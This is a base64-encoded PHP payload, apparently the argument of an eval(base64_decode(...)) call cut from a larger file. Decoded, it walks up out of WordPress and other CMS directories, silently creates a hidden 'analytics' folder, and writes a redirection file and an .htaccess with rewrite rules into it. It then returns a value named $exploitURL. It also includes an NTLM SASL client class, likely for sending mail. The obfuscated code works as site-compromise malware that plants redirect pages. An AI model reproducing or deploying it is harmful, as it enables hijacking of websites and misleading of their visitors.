CiAgICAgICAgd2hpbGUgKHRydWUpIHsNCiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvKD86d3AtY29udGVudFwvcGx1Z2luc3x3cC1jb250ZW50XC90aGVtZXN8d3AtaW5jbHVkZXN8d3AtYWRtaW58d3AtY29udGVudHxtb2R1bGVzXC9tb2Rfd2RiYW5uZXJzfGluY2x1ZGVzXC98Z29vZ2xlX3JlY29tbWVuZHN8bXQtc3RhdGljfGRhdGFcL21vZHVsZSkvJywgcGFyc2VfdXJsKCRSZWRpcmVjdGlvbkRpciwgUEhQX1VSTF9QQVRIKSkpIHsNCiAgICAgICAgICAgICAgICAkRm9sZGVyIC49ICIuLi8iOw0KICAgICAgICAgICAgICAgICRSZWRpcmVjdGlvbkRpciA9IHBhcmVudGRpcigkUmVkaXJlY3Rpb25EaXIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoIWZpbGVfZXhpc3RzKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvIiAuICRGaWxlbmFtZSkpIHsNCiAgICAgICAgaWYgKCFpc19kaXIoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSKSkgew0KICAgICAgICAgICAgQG1rZGlyKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUik7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2RpcigkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIpKSB7DQogICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iIC4gJEZpbGVuYW1lLCBSZWRpcmVjdGlvbkZpbGUoKSk7DQogICAgICAgICAgICAkQ29udGVudCAgID0gYXJyYXkoKTsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+JzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnCTxJZk1vZHVsZSBtb2RfZW52LmM+JzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnCQlTZXRFbnYgSFRUUF9NT0RfUkVXUklURV9TSEVMTCBPbic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJwk8L0lmTW9kdWxlPic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVFbmdpbmUgT24nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1sJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUNvbmQgJXtSRVFVRVNUX1VSSX0gIS1sJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhXC4oaWNvfGNzc3xwbmd8anBnfGdpZnxqcykkIFtOQ10nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlUnVsZSAuIGluZGV4LnBocCc7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJzwvSWZNb2R1bGU+JzsNCiAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIgLiAiLy5odGFjY2VzcyIsIGltcGxvZGUoUEhQX0VPTCwgJENvbnRlbnQpKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoIWZpbGVfZXhpc3RzKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvIiAuICRGaWxlbmFtZSkpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBpZiAoIWlzUmV3cml0ZU9OKCkpIHsNCiAgICAgICAgJGV4cGxvaXRVUkwgPSAkUmVkaXJlY3Rpb25EaXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvP3Jld3JpdGU9IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkZXhwbG9pdFVSTCA9ICRSZWRpcmVjdGlvbkRpciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iOw0KICAgIH0NCiAgICByZXR1cm4gJGV4cGxvaXRVUkw7DQp9DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9TVEFSVCIsIDApOw0KZGVmaW5lKCJTQVNMX05UTE1fU1RBVEVfSURFTlRJRllfRE9NQUlOIiwgMSk7DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9SRVNQT05EX0NIQUxMRU5HRSIsIDIpOw0KZGVmaW5lKCJTQVNMX05UTE1fU1RBVEVfRE9ORSIsIDMpOw0KZGVmaW5lKCJTQVNMX0ZBSUwiLCAtMSk7DQpkZWZpbmUoIlNBU0xfQ09OVElOVUUiLCAxKTsNCg0KY2xhc3MgbnRsbV9zYXNsX2NsaWVudF9jbGFzcw0Kew0KICAgIHB1YmxpYyAkY3JlZGVudGlhbHMgPSBhcnJheSgpOw0KICAgIHB1YmxpYyAkc3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfU1RBUlQ7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5pdGlhbGl6ZSgmJGNsaWVudCkNCiAgICB7DQogICAgICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCRmdW5jdGlvbiA9ICJtY3J5cHRfZW5jcnlwdCIpDQogICAgICAgICAgICB8fCAhZnVuY3Rpb25fZXhpc3RzKCRmdW5jdGlvbiA9ICJtaGFzaCIpDQogICAgICAgICkgew0KICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAibWNyeXB0X2VuY3J5cHQiID0+ICJtY3J5cHQiLA0KICAgICAgICAgICAgICAgICJtaGFzaCIgPT4gIm1oYXNoIg0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICRjbGllbnQtPmVycm9yID0gInRoZSBleHRlbnNpb24gIiAuICRleHRlbnNpb25zWyRmdW5jdGlvbl0gLg0KICAgICAgICAgICAgICAgICIgcmVxdWlyZWQgYnkgdGhlIE5UTE0gU0FTTCBjbGllbnQgY2xhc3MgaXMgbm90IGF2YWlsYWJsZSBpbiB0aGlzIFBIUCBjb25maWd1cmF0aW9uIjsNCiAgICAgICAgICAgIHJldHVybiAoMCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICgxKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gQVNDSUlUb1VuaWNvZGUoJGFzY2lpKQ0KICAgIHsNCiAgICAgICAgZm9yICgkdW5pY29kZSA9ICIiLCAkYSA9IDA7ICRhIDwgc3RybGVuKCRhc2NpaSk7ICRhKyspIHsNCiAgICAgICAgICAgICR1bmljb2RlIC49IHN1YnN0cigkYXNjaWksICRhLCAxKSAuIGNocigwKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gKCR1bmljb2RlKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gdHlwZU1zZzEoJGRvbWFpbiwgJHdvcmtzdGF0aW9uKQ0KICAgIHsNCiAgICAgICAgJGRvbWFpbl9sZW5ndGggPSBzdHJsZW4oJGRvbWFpbik7DQogICAgICAgICR3b3Jrc3RhdGlvbl9sZW5ndGggPSBzdHJsZW4oJHdvcmtzdGF0aW9uKTsNCiAgICAgICAgJHdvcmtzdGF0aW9uX29mZnNldCA9IDMyOw0KICAgICAgICAkZG9tYWluX29mZnNldCA9ICR3b3Jrc3RhdGlvbl9vZmZzZXQgKyAkd29ya3N0YXRpb25fbGVuZ3RoOw0KICAgICAgICByZXR1cm4gKA0KICAgICAgICAgICAgIk5UTE1TU1BcMCIgLg0KICAgICAgICAgICAgIlx4MDFceDAwXHgwMFx4MDAiIC4NCiAgICAgICAgICAgICJceDA3XHgzMlx4MDBceDAwIiAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGRvbWFpbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkZG9tYWluX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRkb21haW5fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHdvcmtzdGF0aW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR3b3Jrc3RhdGlvbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkd29ya3N0YXRpb25fb2Zmc2V0KSAuDQogICAgICAgICAgICAkd29ya3N0YXRpb24gLg0KICAgICAgICAgICAgJGRvbWFpbg0KICAgICAgICApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBOVExNUmVzcG9uc2UoJGNoYWxsZW5nZSwgJHBhc3N3b3JkKQ0KICAgIHsNCiAgICAgICAgJHVuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJHBhc3N3b3JkKTsNCiAgICAgICAgJG1kNCA9IG1oYXNoKE1IQVNIX01ENCwgJHVuaWNvZGUpOw0KICAgICAgICAkcGFkZGVkID0gJG1kNCAuIHN0cl9yZXBlYXQoY2hyKDApLCAyMSAtIHN0cmxlbigkbWQ0KSk7DQogICAgICAgICRpdl9zaXplID0gbWNyeXB0X2dldF9pdl9zaXplKE1DUllQVF9ERVMsIE1DUllQVF9NT0RFX0VDQik7DQogICAgICAgICRpdiA9IG1jcnlwdF9jcmVhdGVfaXYoJGl2X3NpemUsIE1DUllQVF9SQU5EKTsNCiAgICAgICAgZm9yICgkcmVzcG9uc2UgPSAiIiwgJHRoaXJkID0gMDsgJHRoaXJkIDwgMjE7ICR0aGlyZCArPSA3KSB7DQogICAgICAgICAgICBmb3IgKCRwYWNrZWQgPSAiIiwgJHAgPSAkdGhpcmQ7ICRwIDwgJHRoaXJkICsgNzsgJHArKykgew0KICAgICAgICAgICAgICAgICRwYWNrZWQgLj0gc3RyX3BhZChkZWNiaW4ob3JkKHN1YnN0cigkcGFkZGVkLCAkcCwgMSkpKSwgOCwgIjAiLCBTVFJfUEFEX0xFRlQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yICgka2V5ID0gIiIsICRwID0gMDsgJHAgPCBzdHJsZW4oJHBhY2tlZCk7ICRwICs9IDcpIHsNCiAgICAgICAgICAgICAgICAkcyA9IHN1YnN0cigkcGFja2VkLCAkcCwgNyk7DQogICAgICAgICAgICAgICAgJGIgPSAkcyAuICgoc3Vic3RyX2NvdW50KCRzLCAiMSIpICUgMikgPyAiMCIgOiAiMSIpOw0KICAgICAgICAgICAgICAgICRrZXkgLj0gY2hyKGJpbmRlYygkYikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGNpcGhlcnRleHQgPSBtY3J5cHRfZW5jcnlwdChNQ1JZUFRfREVTLCAka2V5LCAkY2hhbGxlbmdlLCBNQ1JZUFRfTU9ERV9FQ0IsICRpdik7DQogICAgICAgICAgICAkcmVzcG9uc2UgLj0gJGNpcGhlcnRleHQ7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXNwb25zZTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gdHlwZU1zZzMoJG50bG1fcmVzcG9uc2UsICR1c2VyLCAkZG9tYWluLCAkd29ya3N0YXRpb24pDQogICAgew0KICAgICAgICAkZG9tYWluX3VuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJGRvbWFpbik7DQogICAgICAgICRkb21haW5fbGVuZ3RoID0gc3RybGVuKCRkb21haW5fdW5pY29kZSk7DQogICAgICAgICRkb21haW5fb2Zmc2V0ID0gNjQ7DQogICAgICAgICR1c2VyX3VuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJHVzZXIpOw0KICAgICAgICAkdXNlcl9sZW5ndGggPSBzdHJsZW4oJHVzZXJfdW5pY29kZSk7DQogICAgICAgICR1c2VyX29mZnNldCA9ICRkb21haW5fb2Zmc2V0ICsgJGRvbWFpbl9sZW5ndGg7DQogICAgICAgICR3b3Jrc3RhdGlvbl91bmljb2RlID0gJHRoaXMtPkFTQ0lJVG9Vbmljb2RlKCR3b3Jrc3RhdGlvbik7DQogICAgICAgICR3b3Jrc3RhdGlvbl9sZW5ndGggPSBzdHJsZW4oJHdvcmtzdGF0aW9uX3VuaWNvZGUpOw0KICAgICAgICAkd29ya3N0YXRpb25fb2Zmc2V0ID0gJHVzZXJfb2Zmc2V0ICsgJHVzZXJfbGVuZ3RoOw0KICAgICAgICAkbG0gPSAiIjsNCiAgICAgICAgJGxtX2xlbmd0aCA9IHN0cmxlbigkbG0pOw0KICAgICAgICAkbG1fb2Zmc2V0ID0gJHdvcmtzdGF0aW9uX29mZnNldCArICR3b3Jrc3RhdGlvbl9sZW5ndGg7DQogICAgICAgICRudGxtID0gJG50bG1fcmVzcG9uc2U7DQogICAgICAgICRudGxtX2xlbmd0aCA9IHN0cmxlbigkbnRsbSk7DQogICAgICAgICRudGxtX29mZnNldCA9ICRsbV9vZmZzZXQgKyAkbG1fbGVuZ3RoOw0KICAgICAgICAkc2Vzc2lvbiA9ICIiOw0KICAgICAgICAkc2Vzc2lvbl9sZW5ndGggPSBzdHJsZW4oJHNlc3Npb24pOw0KICAgICAgICAkc2Vzc2lvbl9vZmZzZXQgPSAkbnRsbV9vZmZzZXQgKyAkbnRsbV9sZW5ndGg7DQogICAgICAgIHJldHVybiAoDQogICAgICAgICAgICAiTlRMTVNTUFwwIiAuDQogICAgICAgICAgICAiXHgwM1x4MDBceDAwXHgwMCIgLg0KICAgICAgICAgICAgcGFjaygidiIsICRsbV9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkbG1fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJGxtX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRudGxtX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRudGxtX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRudGxtX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRkb21haW5fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGRvbWFpbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkZG9tYWluX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR1c2VyX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR1c2VyX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICR1c2VyX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR3b3Jrc3RhdGlvbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkd29ya3N0YXRpb25fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJHdvcmtzdGF0aW9uX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRzZXNzaW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRzZXNzaW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRzZXNzaW9uX29mZnNldCkgLg0KICAgICAgICAgICAgIlx4MDFceDAyXHgwMFx4MDAiIC4NCiAgICAgICAgICAgICRkb21haW5fdW5pY29kZSAuDQogICAgICAgICAgICAkdXNlcl91bmljb2RlIC4NCiAgICAgICAgICAgICR3b3Jrc3RhdGlvbl91bmljb2RlIC4NCiAgICAgICAgICAgICRsbSAuDQogICAgICAgICAgICAkbnRsbQ0KICAgICAgICApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBzdGFydCgmJGNsaWVudCwgJiRtZXNzYWdlLCAmJGludGVyYWN0aW9ucykNCiAgICB7DQogICAgICAgIGlmICgkdGhpcy0+c3RhdGUgIT0gU0FTTF9OVExNX1NUQVRFX1NUQVJUKSB7DQogICAgICAgICAgICAkY2xpZW50LT5lcnJvciA9ICJOVExNIGF1dGhlbnRpY2F0aW9uIHN0YXRlIGlzIG5vdCBhdCB0aGUgc3RhcnQiOw0KICAgICAgICAgICAgcmV0dXJuIChTQVNMX0ZBSUwpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5jcmVkZW50aWFscyA9IGFycmF5KA0KICAgICAgICAgICAgInVzZXIiID0+ICIiLA0KICAgICAgICAgICAgInBhc3N3b3JkIiA9PiAiIiwNCiAgICAgICAgICAgICJyZWFsbSIgPT4gIiIsDQogICAgICAgICAgICAid29ya3N0YXRpb24iID0+ICIiDQogICAgICAgICk7DQogICAgICAgICRkZWZhdWx0cyA9IGFycmF5KCk7DQogICAgICAgICRzdGF0dXMgPSAkY2xpZW50LT5HZXRDcmVkZW50aWFscygkdGhpcy0+Y3JlZGVudGlhbHMsICRkZWZhdWx0cywgJGludGVyYWN0aW9ucyk7DQogICAgICAgIGlmICgkc3RhdHVzID09IFNBU0xfQ09OVElOVUUpIHsNCiAgICAgICAgICAgICR0aGlzLT5zdGF0ZSA9IFNBU0xfTlRMTV9TVEFURV9JREVOVElGWV9ET01BSU47DQogICAgICAgIH0NCiAgICAgICAgdW5zZXQoJG1lc3NhZ2UpOw0KICAgICAgICByZXR1cm4gKCRzdGF0dXMpOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBzdGVwKCYkY2xpZW50LCAkcmVzcG9uc2UsICYkbWVzc2FnZSwgJiRpbnRlcmFjdGlvbnMpDQogICAgew0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5zdGF0ZSkgew0KICAgICAgICAgICAgY2FzZSBTQVNMX05UTE1fU1RBVEVfSURFTlRJRllfRE9NQUlOOg0KICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPnR5cGVNc2cxKCR0aGlzLT5jcmVkZW50aWFsc1sicmVhbG0iXSwgJHRoaXMtPmNyZWRlbnRpYWxzWyJ3b3Jrc3RhdGlvbiJdKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfUkVTUE9ORF9DSEFMTEVOR0U7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlIFNBU0xfTlRMTV9TVEFURV9SRVNQT05EX0NIQUxMRU5HRToNCiAgICAgICAgICAgICAgICAkbnRsbV9yZXNwb25zZSA9ICR0aGlzLT5OVExNUmVzcG9uc2Uoc3Vic3RyKCRyZXNwb25zZSwgMjQsIDgpLCAkdGhpcy0+Y3JlZGVudGlhbHNbInBhc3N3b3JkIl0pOw0KICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPnR5cGVNc2czKA0KICAgICAgICAgICAgICAgICAgICAkbnRsbV9yZXNwb25zZSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzWyJ1c2VyIl0sDQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jcmVkZW50aWFsc1sicmVhbG0iXSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzWyJ3b3Jrc3RhdGlvbiJdDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfRE9ORTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgU0FTTF9OVExNX1NUQVRFX0RPTkU6DQogICAgICAgICAgICAgICAgJGNsaWVudC0+ZXJyb3IgPSAiTlRMTSBhdXRoZW50aWNhdGlvbiB3YXMgZmluaXNoZWQgd2l0aG91dCBzdWNjZXNzIjsNCiAgICAgICAgICAgICAgICByZXR1cm4gKFNBU0xfRkFJTCk7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRjbGllbnQtPmVycm9yID0gImludmFsaWQgTlRMTSBhdXRoZW50aWNhdGlvbiBzdGVwIHN0YXRlIjsNCiAgICAgICAgICAgICAgICByZXR1cm4gKFNBU0xfRkFJTCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIChTQVNMX0NPTlRJTlVFKTsNCiAgICB9DQp9DQo="));
